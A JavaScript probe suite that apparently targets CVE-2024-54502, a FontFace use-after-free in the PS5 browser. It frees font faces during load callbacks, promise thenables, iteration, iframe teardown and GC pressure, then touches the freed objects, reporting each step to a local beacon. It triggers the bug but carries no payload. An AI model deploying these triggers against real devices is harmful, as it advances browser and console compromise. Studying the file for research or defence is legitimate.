// p204 — FontFace UAF probe suite
//
// PS5 14.20 has FontFace and FontFaceSet APIs.
// CVE-2024-54502: CSSFontFaceSource dangling reference after loadDone()
// Strategy: trigger font load callbacks, destroy/clear font faces during
// callback execution, then access freed memory.
//
// Also probes for:
// - Promise thenable injection during font load resolution
// - FontFaceSet iteration invalidation during loading events
// - Race between font load completion and document.fonts.clear()
//
// Beacon prefix: V204-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V204-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // Minimal valid WOFF font (empty glyph table, just enough to load)
  // Base64-encoded minimal TrueType font
  var FONT_DATA = 'data:font/truetype;base64,AAEAAAAKAIAAAwAgT1MvMgAAAAAAAAEoAAAAVmNtYXAAAAAAAAGAAAAARGN2dCAAAAAAAAHEAAAABGdhc3AAAAAAAAAByAAAABBnbHlmAAAAAAAAAdgAAAAYaGVhZAAAAAAAAfAAAAA2aGhlYQAAAAAAAAIoAAAAJGhtdHgAAAAAAAACTAAAABBsb2NhAAAAAAAAAlwAAAAKbWF4cAAAAAAAAmgAAAAgbmFtZQAAAAAAAAKIAAAAOXBvc3QAAAAAAAACxAAAABQAAQAAAAEAACYWkF9fDzz1AAsEAAAAAABg+CAAAAAAAGD4IAAAAAAABAABgAAAAAgAAgAAAAAAAAABAAABgAAAAFgEAAAAAAAEAAABAAAAAAAAAAAAAAAAAAAAAAQEAAAAAAAAAAAAAAAAAAAAFAAEAAAAEAAwAAgAAAAAAAgAAAAoACgAAAP8AAAAAAAAAAQAAAAEAAAAAAAAAAQAAAAAAAAEA';

  var tests = [];
  var currentTest = 0;

  // ── TEST A: Basic FontFace load + clear during callback ──
  tests.push({name: 'A-LOAD-CLEAR', run: function(done) {
    try {
      var face = new FontFace('TestA', 'url(' + FONT_DATA + ')');
      document.fonts.add(face);
      B('A-ADDED');

      face.load().then(function() {
        B('A-LOADED');
        document.fonts.clear();
        B('A-CLEARED');

        // Access face properties after clear
        try {
          var s = face.status;
          B('A-STATUS-' + s);
        } catch (e) {
          B('A-STATUS-ERR-' + e.name);
        }

        // Try to use the face
        try {
          var s2 = face.family;
          B('A-FAMILY-' + (s2 ? 'OK' : 'NULL'));
        } catch (e) {
          B('A-FAMILY-ERR');
        }
        done();
      }).catch(function(e) {
        B('A-CATCH-' + e.name);
        done();
      });
    } catch (e) {
      B('A-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST B: Thenable injection during promise resolution ──
  tests.push({name: 'B-THENABLE', run: function(done) {
    try {
      var faces = [];
      for (var i = 0; i < 10; i++) {
        var f = new FontFace('TestB' + i, 'url(' + FONT_DATA + ')');
        document.fonts.add(f);
        faces.push(f);
      }
      B('B-ADDED-10');

      // Load all fonts
      var loadPromises = faces.map(function(f) { return f.load(); });

      // Create a thenable that triggers during promise resolution
      var thenableTriggered = false;
      var thenable = {
        then: function(resolve, reject) {
          if (!thenableTriggered) {
            thenableTriggered = true;
            B('B-THENABLE-FIRED');
            // During promise resolution, clear all fonts
            document.fonts.clear();
            B('B-CLEARED-IN-THEN');

            // Try to access faces after clear
            for (var j = 0; j < faces.length; j++) {
              try {
                var st = faces[j].status;
                if (j === 0) B('B-POST-STATUS-' + st);
              } catch (e) {
                B('B-POST-ERR-' + j);
                break;
              }
            }
          }
          resolve(thenable); // Recursive resolution to stress the path
        }
      };

      Promise.all(loadPromises).then(function() {
        B('B-ALL-LOADED');
        // Chain with thenable
        return thenable;
      }).then(function() {
        B('B-RESOLVED');
        done();
      }).catch(function(e) {
        B('B-CATCH-' + (e ? e.name || e : 'unknown'));
        done();
      });

      // Timeout fallback
      setTimeout(function() {
        if (!thenableTriggered) B('B-TIMEOUT');
        done();
      }, 5000);
    } catch (e) {
      B('B-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST C: FontFaceSet iteration invalidation ──
  tests.push({name: 'C-ITER-INVAL', run: function(done) {
    try {
      // Add many font faces
      var faces = [];
      for (var i = 0; i < 20; i++) {
        var f = new FontFace('TestC' + i, 'url(' + FONT_DATA + ')');
        document.fonts.add(f);
        faces.push(f);
      }
      B('C-ADDED-20');

      // Start loading
      document.fonts.ready.then(function() {
        B('C-READY');

        // Iterate while modifying
        try {
          var count = 0;
          document.fonts.forEach(function(font) {
            count++;
            if (count === 5) {
              // Remove fonts during iteration
              for (var j = 10; j < 20; j++) {
                document.fonts.delete(faces[j]);
              }
              B('C-DELETED-DURING-ITER');
            }
          });
          B('C-ITER-DONE-' + count);
        } catch (e) {
          B('C-ITER-ERR-' + e.name);
        }

        document.fonts.clear();
        done();
      });
    } catch (e) {
      B('C-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST D: Delete face during load event ──
  tests.push({name: 'D-DEL-DURING-LOAD', run: function(done) {
    try {
      var face1 = new FontFace('TestD1', 'url(' + FONT_DATA + ')');
      var face2 = new FontFace('TestD2', 'url(' + FONT_DATA + ')');
      document.fonts.add(face1);
      document.fonts.add(face2);
      B('D-ADDED-2');

      // Set up loadingdone event that removes fonts
      document.fonts.onloadingdone = function(ev) {
        B('D-LOADINGDONE-' + ev.fontfaces.length);
        // Delete the faces that just loaded
        document.fonts.delete(face1);
        document.fonts.delete(face2);
        B('D-DELETED-IN-EVENT');

        // Try to access the event's fontfaces after deletion
        try {
          for (var k = 0; k < ev.fontfaces.length; k++) {
            var st = ev.fontfaces[k].status;
            B('D-EV-STATUS-' + k + '-' + st);
          }
        } catch (e) {
          B('D-EV-ERR-' + e.name);
        }
      };

      face1.load();
      face2.load();

      setTimeout(function() {
        document.fonts.onloadingdone = null;
        document.fonts.clear();
        done();
      }, 3000);
    } catch (e) {
      B('D-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST E: Rapid add/delete/load cycle ──
  tests.push({name: 'E-RAPID-CYCLE', run: function(done) {
    try {
      var crashCount = 0;
      B('E-START');

      for (var round = 0; round < 50; round++) {
        var f = new FontFace('TestE' + round, 'url(' + FONT_DATA + ')');
        document.fonts.add(f);
        f.load();
        document.fonts.delete(f);

        // Immediately reuse with same name
        var f2 = new FontFace('TestE' + round, 'url(' + FONT_DATA + ')');
        document.fonts.add(f2);
        f2.load();
        document.fonts.delete(f2);
      }
      B('E-CYCLES-50');

      // Wait for all pending load callbacks
      setTimeout(function() {
        B('E-SETTLED');
        document.fonts.clear();
        done();
      }, 2000);
    } catch (e) {
      B('E-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST F: Cross-document font face adoption ──
  tests.push({name: 'F-CROSS-DOC', run: function(done) {
    try {
      var iframe = document.createElement('iframe');
      iframe.srcdoc = '<html><body></body></html>';
      document.body.appendChild(iframe);

      iframe.onload = function() {
        B('F-IFRAME-READY');
        var iframeDoc = iframe.contentDocument;

        // Create font in iframe
        var face = new FontFace('TestF', 'url(' + FONT_DATA + ')');
        iframeDoc.fonts.add(face);
        B('F-ADDED-TO-IFRAME');

        face.load().then(function() {
          B('F-LOADED-IN-IFRAME');

          // Remove iframe (destroys document)
          document.body.removeChild(iframe);
          B('F-IFRAME-REMOVED');

          // Try to access font face from destroyed document
          try {
            var st = face.status;
            B('F-ORPHAN-STATUS-' + st);
          } catch (e) {
            B('F-ORPHAN-ERR-' + e.name);
          }

          // Try to add orphan face to main document
          try {
            document.fonts.add(face);
            B('F-READDED-OK');
            var st2 = face.status;
            B('F-READDED-STATUS-' + st2);
            document.fonts.clear();
          } catch (e) {
            B('F-READD-ERR-' + e.name);
          }

          done();
        }).catch(function(e) {
          B('F-CATCH-' + e.name);
          document.body.removeChild(iframe);
          done();
        });
      };
    } catch (e) {
      B('F-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST G: Font face with Blob URL that gets revoked during load ──
  tests.push({name: 'G-REVOKE-DURING-LOAD', run: function(done) {
    try {
      // Create a blob font URL
      var fontBytes = Uint8Array.from(atob(FONT_DATA.split(',')[1]), function(c) { return c.charCodeAt(0); });
      var blob = new Blob([fontBytes], {type: 'font/truetype'});
      var blobUrl = URL.createObjectURL(blob);
      B('G-BLOB-URL-CREATED');

      var faces = [];
      for (var i = 0; i < 10; i++) {
        var f = new FontFace('TestG' + i, 'url(' + blobUrl + ')');
        document.fonts.add(f);
        faces.push(f);
      }
      B('G-ADDED-10');

      // Start loading, then immediately revoke the blob URL
      var loadPromises = faces.map(function(f) { return f.load(); });
      URL.revokeObjectURL(blobUrl);
      B('G-REVOKED');

      Promise.all(loadPromises.map(function(p) {
        return p.then(function() { return 'OK'; }).catch(function(e) { return 'ERR-' + e.name; });
      })).then(function(results) {
        var ok = results.filter(function(r) { return r === 'OK'; }).length;
        var err = results.length - ok;
        B('G-RESULTS-OK' + ok + '-ERR' + err);

        // Access faces after URL revocation and settlement
        for (var j = 0; j < faces.length; j++) {
          try {
            var st = faces[j].status;
            if (j === 0) B('G-STATUS-0-' + st);
          } catch (e) {
            B('G-STATUS-ERR-' + j);
            break;
          }
        }
        document.fonts.clear();
        done();
      });
    } catch (e) {
      B('G-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST H: Structured clone of FontFace during load ──
  tests.push({name: 'H-CLONE', run: function(done) {
    try {
      var face = new FontFace('TestH', 'url(' + FONT_DATA + ')');
      document.fonts.add(face);

      face.load().then(function() {
        B('H-LOADED');

        // Try structuredClone on loaded face
        try {
          var clone = structuredClone(face);
          B('H-CLONE-OK');
        } catch (e) {
          B('H-CLONE-ERR-' + e.name);
        }

        // Try postMessage with face
        try {
          var ch = new MessageChannel();
          ch.port2.onmessage = function(ev) {
            B('H-MSG-GOT-' + typeof ev.data);
          };
          ch.port1.postMessage(face);
          B('H-POST-OK');
        } catch (e) {
          B('H-POST-ERR-' + e.name);
        }

        document.fonts.clear();
        done();
      }).catch(function(e) {
        B('H-CATCH-' + e.name);
        done();
      });
    } catch (e) {
      B('H-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST I: GC pressure during font load ──
  tests.push({name: 'I-GC-PRESSURE', run: function(done) {
    try {
      var weakRefs = [];
      var faces = [];

      for (var i = 0; i < 20; i++) {
        var f = new FontFace('TestI' + i, 'url(' + FONT_DATA + ')');
        document.fonts.add(f);
        faces.push(f);
        weakRefs.push(new WeakRef(f));
      }
      B('I-ADDED-20');

      // Start loading all
      var loadPromises = faces.map(function(f) { return f.load(); });

      // Clear strong references and add GC pressure
      document.fonts.clear();
      faces = null;
      B('I-CLEARED-REFS');

      // Heavy GC pressure
      var garbage = [];
      for (var g = 0; g < 1000; g++) {
        garbage.push(new ArrayBuffer(65536));
      }
      garbage = null;
      B('I-GC-PRESSURE');

      // Check WeakRefs — were faces collected?
      setTimeout(function() {
        var alive = 0;
        for (var j = 0; j < weakRefs.length; j++) {
          if (weakRefs[j].deref()) alive++;
        }
        B('I-ALIVE-' + alive + '-OF-20');

        // The load promises should still resolve/reject
        Promise.all(loadPromises.map(function(p) {
          return p.then(function() { return 'OK'; }).catch(function(e) { return 'ERR'; });
        })).then(function(results) {
          var ok = results.filter(function(r) { return r === 'OK'; }).length;
          B('I-RESOLVED-OK' + ok);
          done();
        });
      }, 1000);
    } catch (e) {
      B('I-ERR-' + e.name);
      done();
    }
  }});

  // ── Run all tests sequentially ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }

    var t = tests[currentTest];
    currentTest++;
    B(t.name + '-START');

    var timedOut = false;
    var completed = false;

    var timeout = setTimeout(function() {
      if (!completed) {
        timedOut = true;
        B(t.name + '-TIMEOUT');
        runNext();
      }
    }, 8000);

    t.run(function() {
      if (!timedOut) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 300);
      }
    });
  }

  runNext();
})();
